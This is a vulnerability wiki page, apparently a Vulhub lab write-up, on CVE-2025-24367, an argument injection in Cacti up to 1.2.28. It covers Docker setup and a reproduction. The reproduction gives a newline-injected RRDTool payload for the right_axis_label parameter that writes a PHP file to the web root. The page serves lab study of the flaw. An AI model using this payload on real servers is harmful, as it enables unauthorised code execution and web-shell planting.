<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Cacti/CVE-2025-24367/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Cacti RRDTool Post-Auth Argument Injection Leads to RCE (CVE-2025-24367) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Cacti RRDTool Post-Auth Argument Injection Leads to RCE (CVE-2025-24367)", url: "#_top", children: [
              {title: "Environment Setup", url: "#environment-setup" },
              {title: "Vulnerability Reproduction", url: "#vulnerability-reproduction" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Cacti RRDTool后台参数注入导致远程代码执行 (CVE-2025-24367)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2023-39361/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2023-39361/README.zh-cn/" class="btn btn-xs btn-link">
        Cacti graph_view.php SQL注入导致远程代码执行漏洞（CVE-2023-39361/CVE-2024-31459）
      </a>
    </div>
    
  </div>

    

    <h1 id="cacti-rrdtool-post-auth-argument-injection-leads-to-rce-cve-2025-24367">Cacti RRDTool Post-Auth Argument Injection Leads to RCE (CVE-2025-24367)<a class="headerlink" href="#cacti-rrdtool-post-auth-argument-injection-leads-to-rce-cve-2025-24367" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Cacti is a complete network graphing solution designed to harness the power of RRDTool's data storage and graphing functionality. Versions of Cacti up to 1.2.28 have a argument injection vulnerability that allows authenticated users to create arbitrary PHP files on the web server, potentially leading to remote code execution.</p>
<p>The vulnerability occurs in the graph template functionality where user input for RRDTool command parameters, such as <code>--right-axis-label</code>, is not properly sanitized. While Cacti attempts to escape shell metacharacters using <code>cacti_escapeshellarg()</code>, it fails to handle newline characters. This allows attackers to break out of the intended command context and inject additional RRDTool commands, resulting in the ability to write malicious PHP files to the web root.</p>
<p>References:</p>
<ul>
<li><a href="https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq">https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq</a></li>
<li><a href="https://github.com/Cacti/cacti/commit/c7e4ee798d263a3209ae6e7ba182c7b65284d8f0">https://github.com/Cacti/cacti/commit/c7e4ee798d263a3209ae6e7ba182c7b65284d8f0</a></li>
</ul>
<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
<p>Execute the following command to start Cacti 1.2.28:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the service is started, you can access <a href="http://your-ip:8080">http://your-ip:8080</a> to visit Cacti. The default credentials are admin/admin.</p>
<p>Log in as admin and follow the initialization instructions. Simply click the "Next" button repeatedly until you see the success page.</p>
<h2 id="vulnerability-reproduction">Vulnerability Reproduction<a class="headerlink" href="#vulnerability-reproduction" title="Permanent link">&para;</a></h2>
<p>First, you need to log in to Cacti. On the Cacti console, navigate to "Console → Templates → Graph" and find the "PING - Advanced Ping" template and edit it. Submit and capture the request, then modify the <code>right_axis_label</code> parameter to the following payload (please take care of the line breaks <code>%0a</code>):</p>
<div class="highlight"><pre><span></span><code>XXX
create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
graph vulhub.php -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:&lt;?=phpinfo();?&gt;
</code></pre></div>
<p><img alt="" src="1.png" /></p>
<p>Then, navigate to "Console → Create → New Graphs" and create a new graph with the "PING - Advanced Ping" template:</p>
<p><img alt="" src="2.png" /></p>
<p>After that, navigate to "Graphs → Default Tree → Local Linux Machine" to trigger the payload execution.</p>
<p><img alt="" src="3.png" /></p>
<p>You will see an image with error message "Error: creating arguments", which means the payload has been executed.</p>
<p>Our payload will create two files: a RRD file (my.rrd) and a PHP web shell (vulhub.php) in the Cacti web root:</p>
<p><img alt="" src="4.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Cacti RRDTool后台参数注入导致远程代码执行 (CVE-2025-24367)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2023-39361/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2023-39361/README.zh-cn/" class="btn btn-xs btn-link">
        Cacti graph_view.php SQL注入导致远程代码执行漏洞（CVE-2023-39361/CVE-2024-31459）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>